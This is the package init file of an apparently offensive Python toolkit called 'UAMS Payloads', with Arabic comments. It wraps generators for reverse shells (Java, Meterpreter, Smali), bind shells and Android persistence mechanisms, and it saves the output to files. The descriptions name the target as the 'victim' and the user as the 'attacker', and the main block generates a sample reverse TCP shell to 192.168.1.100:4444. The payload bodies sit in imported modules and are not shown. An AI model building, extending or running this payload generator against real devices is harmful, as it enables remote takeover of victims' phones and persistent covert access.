#!/usr/bin/env python3
"""
UAMS Payloads - مكتبة الحمولات الجاهزة
"""

import os
import sys
from pathlib import Path

# إضافة مسارات المكتبات
sys.path.append(str(Path(__file__).parent))

from reverse_shell import (
    get_shell_code,
    get_available_shells,
    JAVA_REVERSE_TCP,
    JAVA_METERPRETER,
    SMALI_REVERSE_SHELL
)

from bind_shell import (
    get_bind_shell_code,
    JAVA_BIND_SHELL,
    PYTHON_BIND_SHELL
)

from persistence import (
    get_persistence_code,
    get_all_persistence_methods,
    ANDROID_BOOT_RECEIVER,
    ANDROID_PERSISTENT_SERVICE
)

__all__ = [
    # Reverse Shell
    'get_shell_code',
    'get_available_shells',
    'JAVA_REVERSE_TCP',
    'JAVA_METERPRETER',
    'SMALI_REVERSE_SHELL',
    
    # Bind Shell
    'get_bind_shell_code',
    'JAVA_BIND_SHELL',
    'PYTHON_BIND_SHELL',
    
    # Persistence
    'get_persistence_code',
    'get_all_persistence_methods',
    'ANDROID_BOOT_RECEIVER',
    'ANDROID_PERSISTENT_SERVICE'
]

class PayloadManager:
    """مدير الحمولات"""
    
    def __init__(self):
        self.payloads_dir = Path(__file__).parent
    
    def list_payloads(self):
        """عرض جميع الحمولات المتاحة"""
        payloads = {
            'reverse_shell': {
                'name': 'Reverse Shell',
                'description': 'اتصال عكسي من الضحية للمهاجم',
                'types': get_available_shells()
            },
            'bind_shell': {
                'name': 'Bind Shell',
                'description': 'يفتح منفذاً على الجهاز الضحية',
                'types': {
                    'java': 'Java Bind Shell',
                    'python': 'Python Bind Shell',
                    'php': 'PHP Bind Shell'
                }
            },
            'persistence': {
                'name': 'Persistence',
                'description': 'آليات الاستمرارية والبقاء',
                'types': get_all_persistence_methods()
            }
        }
        
        return payloads
    
    def generate_payload(self, payload_type, shell_type, **kwargs):
        """توليد حمولة"""
        if payload_type == 'reverse_shell':
            return get_shell_code(shell_type, **kwargs)
        elif payload_type == 'bind_shell':
            return get_bind_shell_code(shell_type, **kwargs)
        elif payload_type == 'persistence':
            return get_persistence_code(shell_type)
        else:
            raise ValueError(f"نوع الحمولة غير معروف: {payload_type}")
    
    def save_payload(self, payload_code, filename, output_dir="generated_payloads"):
        """حفظ الحمولة في ملف"""
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        file_path = output_path / filename
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(payload_code)
        
        return str(file_path)
    
    def validate_payload(self, payload_code):
        """التحقق من صحة الحمولة"""
        if not payload_code or len(payload_code) < 10:
            return False, "الحمولة فارغة أو قصيرة جداً"
        
        # تحقق أساسي (يمكن إضافة المزيد)
        required_keywords = ['java', 'class', 'import', 'public']
        for keyword in required_keywords:
            if keyword in payload_code.lower():
                return True, "الحمولة صالحة"
        
        return False, "الحمولة لا تحتوي على كلمات رئيسية Java"

# كائن عام للاستخدام
payload_manager = PayloadManager()

if __name__ == "__main__":
    print("📦 UAMS Payloads Library")
    print("="*50)
    
    # عرض الحمولات المتاحة
    manager = PayloadManager()
    payloads = manager.list_payloads()
    
    for category, info in payloads.items():
        print(f"\n🔹 {info['name']}:")
        print(f"   {info['description']}")
        print("   الأنواع المتاحة:")
        for type_name, type_desc in info['types'].items():
            print(f"     - {type_name}: {type_desc}")
    
    print("\n" + "="*50)
    print("🎯 مثال: توليد Reverse TCP Shell")
    
    sample_payload = get_shell_code(
        shell_type="reverse_tcp",
        ip="192.168.1.100",
        port=4444
    )
    
    print(f"\n📝 حجم الحمولة: {len(sample_payload)} حرف")
    print(f"📁 أول 200 حرف: {sample_payload[:200]}...")